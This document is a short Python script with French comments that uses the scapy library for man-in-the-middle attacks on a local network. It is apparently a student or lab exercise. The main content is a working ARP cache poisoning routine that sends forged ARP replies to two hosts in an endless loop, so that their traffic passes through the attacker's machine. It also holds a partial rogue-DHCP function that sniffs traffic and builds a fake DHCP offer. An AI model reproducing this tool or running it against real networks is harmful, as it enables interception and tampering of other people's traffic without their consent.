#!/usr/bin/env python3
'''Fichier contenant les fonctions permetant de realiser des attaques MiTM'''
from scapy.all import ARP,Ether, DHCP, IP, UDP, BOOTP, sendp, srp, sniff, hexdump
import time as t
import sys

def mac(ip:str)->str:
  '''Recupere l'adresse MAC associer a une adresse IP grace a un message ARP. \n
  ip: est une adresse IP
  '''
  paquet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip) #Paquet ARP evoyer en broadcast 
  #paquet sert à récuprer une adresse MAC
  rep = srp(paquet, iface='enp0s3') #Reponse au ARP
  return rep[0][0][1].hwsrc #Renvoie l'adresse MAC

def arp(ipa:str, ipb:str)->None:
  '''ARP POISONING: \n
  Procedure permetant de realiser une attaque Man In The Middle par
  empoisonnement de cache ARP. \n
  ipa: Une des deux adresse IP que l'on veut empoisonner.
  ipb: L'autre adresse IP que l'on veut empoisonner.
  '''

  maclist = [mac(ip) for ip in [ipa, ipb]]
  #On cree deux paquets ARP qui associe l'adresse IP (a et b) 
  # à l'adresse MAC du PC sur lequel on réalise l'attaque
  paquet1 = Ether(dst=maclist[0])/ARP(op=2, pdst=ipa, psrc=ipb)
  paquet2 = Ether(dst=maclist[1])/ARP(op=2, pdst=ipb, psrc=ipa)
  while True: #Boucle infinie
    sendp(paquet1, iface='enp0s3')
    sendp(paquet2, iface='enp0s3')
    t.sleep(5) #Arrete le processus durant X secondes

def dhcp():
  def dhcp_reply(paquet):
      if DHCP in paquet:
        reply = Ether(dst = paquet[Ether].src) / IP(dst = paquet[IP].src) / UDP(dport=68, sport=67) / BOOTP(op=2, yiaddr="192.168.56.80") / DHCP(options=[("message-type", "offer"), ('subnet_mask', '255.255.255.0')])
        #sendp(reply, iface='enp0s3')
        return(paquet.show,
               paquet[DHCP].show,
               hexdump(paquet))

  sniff(prn=dhcp_reply,
    filter="udp")
  print("oui")

if __name__ == "__main__":
  if sys.argv[1] == "1":
    arp(sys.argv[2], sys.argv[3])
  if sys.argv[1] == "2":
    dhcp()
  else:
    print("1 adresse_ip1 adresse_ip2 - arp\n2 - dhcp")
